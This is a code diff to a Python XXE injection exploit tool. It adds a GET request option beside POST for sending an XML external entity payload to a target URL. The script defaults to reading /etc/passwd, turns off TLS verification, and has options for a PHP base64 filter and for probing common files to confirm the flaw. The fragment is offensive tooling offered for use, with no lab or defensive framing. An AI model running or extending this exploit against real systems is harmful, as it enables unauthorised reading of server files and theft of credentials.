@@ -48,12 +48,17 @@ def decode_response(text, use_php_filter=False):
     else:
         return text
 
-def exploit_xxe(url, file_path, xml_field="email", use_php_filter=False, proxies=None):
+def exploit_xxe(url, file_path, xml_field="email", use_php_filter=False, proxies=None, method="POST"):
     payload = build_xxe_payload(file_path, xml_field, use_php_filter)
     headers = {"Content-Type": "application/xml"}
 
     try:
-        r = requests.post(url, data=payload, headers=headers, verify=False, proxies=proxies, timeout=10)
+        if method == "POST":
+            r = requests.post(url, data=payload, headers=headers, verify=False, proxies=proxies, timeout=10)
+        elif method == "GET":
+            r = requests.get(url, params={"xml": payload}, headers=headers, verify=False, proxies=proxies, timeout=10)
+        else:
+            raise ValueError(f"Invalid method: {method}")
     except requests.exceptions.RequestException as e:
         print(f"[!] Request error: {e}")
         return None
@@ -94,6 +99,7 @@ def main():
     parser = argparse.ArgumentParser(description="XXE Injection Module")
     parser.add_argument("url", help="Target URL")
     parser.add_argument("file_path", nargs="?", default="/etc/passwd", help="File to read (default: /etc/passwd)")
+    parser.add_argument("--method", default="POST", choices=["POST", "GET"], help="HTTP method (default: POST)")
     parser.add_argument("--field", default="email", help="XML field name to inject into (default: email)")
     parser.add_argument("--php-filter", action="store_true", help="Use PHP filter base64 wrapper (for PHP targets)")
     parser.add_argument("--detect", action="store_true", help="Try common files to confirm XXE exists")
